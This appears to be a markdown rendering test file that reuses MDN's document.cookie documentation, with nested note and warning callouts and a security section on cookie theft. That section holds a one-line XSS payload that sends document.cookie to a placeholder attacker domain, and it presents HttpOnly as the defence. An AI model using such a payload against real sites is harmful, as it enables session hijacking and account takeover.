# Fringe Cases

## Warnings & Notes

> [!NOTE]
> The `document.cookie` can be a source of performance issues because it is a synchronous API and blocks the main thread when reading cookies across processes or performing I/O operations. Developers should if possible use the asynchronous [Cookie Store API](/en-US/docs/Web/API/Cookie_Store_API) to manage cookies.

    > [!NOTE]
    > The domain _must_ match the domain of the JavaScript origin.
    > Setting cookies to foreign domains will be silently ignored.

    > [!WARNING]
    > When user privacy is a concern, it's important that any web app implementation invalidate cookie data after a certain timeout instead of relying on the browser to do it.
    > Many browsers let users specify that cookies should never expire, which is not necessarily safe.

  > [!NOTE]
  > The dash is considered part of the prefix.

  > [!NOTE]
  > These flags are only settable with the `secure` attribute.

> [!NOTE]
> The `document.cookie` property is an [accessor property](/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) with native _setter_ and _getter_ functions, and consequently is _not_ a [data property](/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) with a value: what you write is not the same as what you read, everything is always mediated by the JavaScript interpreter.

## Security Notes

It is important to note that the `path` attribute does _not_ protect against unauthorized reading of the cookie from a different path.
It can be easily bypassed using the DOM, for example by creating a hidden {{HTMLElement("iframe")}} element with the path of the cookie, then accessing this iframe's `contentDocument.cookie` property.
The only way to protect the cookie is by using a different domain or subdomain, due to the [same origin policy](/en-US/docs/Web/Security/Defenses/Same-origin_policy).

Cookies are often used in web applications to identify a user and their authenticated session.
Stealing a cookie from a web application leads to hijacking the authenticated user's session.
Common ways to steal cookies include using [social engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) or by exploiting a [cross-site scripting](/en-US/docs/Glossary/Cross-site_scripting) (XSS) vulnerability in the application -

```js
new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
```

The `HTTPOnly` cookie attribute can help to mitigate this attack by preventing access to cookie value through JavaScript.
Read more about [Cookies and Security](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/).

